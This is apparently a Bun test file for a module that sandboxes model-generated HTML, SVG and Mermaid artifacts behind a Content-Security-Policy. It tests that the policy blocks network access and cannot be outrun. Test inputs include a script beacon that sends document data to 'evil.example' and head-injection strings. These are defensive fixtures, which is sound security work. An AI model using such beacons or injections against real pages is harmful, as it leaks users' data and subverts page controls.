import { describe, expect, test } from "bun:test";
import { ARTIFACT_CSP, buildArtifactShell } from "./artifactShell";

const CSP_MARKER = 'http-equiv="Content-Security-Policy"';

/** The invariant that matters: a meta CSP only governs markup parsed AFTER it,
 *  so the policy must precede every byte of model-supplied content — presence
 *  alone is not containment. */
function expectCspPrecedes(shell: string, contentMarker: string) {
  const csp = shell.indexOf(CSP_MARKER);
  const content = shell.indexOf(contentMarker);
  expect(csp).toBeGreaterThan(-1);
  expect(content).toBeGreaterThan(-1);
  expect(csp).toBeLessThan(content);
}

describe("artifact CSP", () => {
  test("denies all network by default, allows inline + data: only", () => {
    expect(ARTIFACT_CSP).toContain("default-src 'none'");
    expect(ARTIFACT_CSP).toContain("script-src 'unsafe-inline'");
    expect(ARTIFACT_CSP).toContain("style-src 'unsafe-inline'");
    expect(ARTIFACT_CSP).toContain("img-src data:");
    expect(ARTIFACT_CSP).toContain("form-action 'none'");
    expect(ARTIFACT_CSP).toContain("base-uri 'none'");
    expect(ARTIFACT_CSP).not.toContain("http");
    expect(ARTIFACT_CSP).not.toContain("*");
  });

  test("every shell variant embeds the CSP meta tag before its content", () => {
    expectCspPrecedes(
      buildArtifactShell("html", "<p>fragment</p>"),
      "<p>fragment</p>",
    );
    expectCspPrecedes(
      buildArtifactShell(
        "html",
        "<!doctype html><html><head><title>t</title></head><body>x</body></html>",
      ),
      "<title>t</title>",
    );
    expectCspPrecedes(
      buildArtifactShell("html", "<html><body>headless</body></html>"),
      "headless",
    );
    expectCspPrecedes(
      buildArtifactShell("svg", "<svg data-x></svg>"),
      "<svg data-x>",
    );
    expectCspPrecedes(
      buildArtifactShell("mermaid", "graph TD; a-->b", "/* mermaid */"),
      "graph TD",
    );
  });

  test("a leading script cannot outrun the policy", () => {
    // The C4 attack: model HTML front-loads a beacon before its own <html>,
    // hoping the CSP gets spliced somewhere later in the document.
    const attack =
      "<script>fetch('https://evil.example/?d='+document.title)</script>" +
      "<html><head><title>Quarterly report</title></head><body>looks normal</body></html>";
    const shell = buildArtifactShell("html", attack);
    expectCspPrecedes(shell, "<script>fetch(");
  });

  test("model markup can never appear inside the app-owned head", () => {
    const shells = [
      buildArtifactShell(
        "html",
        "</head><head><meta http-equiv=refresh content=0></head>",
      ),
      buildArtifactShell("html", "<head><script>1</script></head>"),
      buildArtifactShell("html", "<!-- <head> --><html><body>x</body></html>"),
    ];
    for (const s of shells) {
      // Our head closes before the first byte of model content.
      const ownHeadEnd = s.indexOf("</head>");
      expect(s.indexOf(CSP_MARKER)).toBeLessThan(ownHeadEnd);
      expect(s.indexOf("<body>")).toBeLessThan(s.length);
      // Exactly one CSP meta — the app's.
      expect(s.split(CSP_MARKER).length - 1).toBe(1);
    }
  });
});

describe("buildArtifactShell", () => {
  test("html fragment is wrapped in a full document", () => {
    const s = buildArtifactShell("html", "<p>hi</p>");
    expect(s).toStartWith("<!doctype html>");
    expect(s).toContain("<p>hi</p>");
  });

  test("complete html document keeps its markup after the app-owned head", () => {
    const doc =
      "<!doctype html><html><head><title>t</title></head><body><p>x</p></body></html>";
    const s = buildArtifactShell("html", doc);
    expect(s).toContain("<title>t</title>");
    expect(s).toContain("<p>x</p>");
    expectCspPrecedes(s, "<title>t</title>");
  });

  test("svg is embedded as markup", () => {
    const s = buildArtifactShell("svg", '<svg viewBox="0 0 1 1"></svg>');
    expect(s).toContain('<svg viewBox="0 0 1 1">');
  });

  test("mermaid source is HTML-escaped and the runtime is inlined", () => {
    const s = buildArtifactShell(
      "mermaid",
      "graph TD; a-->b<script>",
      "var MERMAID_RUNTIME=1;",
    );
    expect(s).toContain("a--&gt;b&lt;script&gt;");
    expect(s).not.toContain("b<script>");
    expect(s).toContain("var MERMAID_RUNTIME=1;");
    expect(s).toContain("mermaid.initialize");
  });

  test("mermaid 12 keeps the pre-12 look: dagre layout, classic style", () => {
    // 12.0 switched the defaults to ELK + the "neo" look, which re-lays out
    // and recolours every existing flowchart/state/class diagram.
    const s = buildArtifactShell("mermaid", "graph TD; a-->b", "");
    expect(s).toContain('"layout":"dagre"');
    expect(s).toContain('"look":"classic"');
  });
});
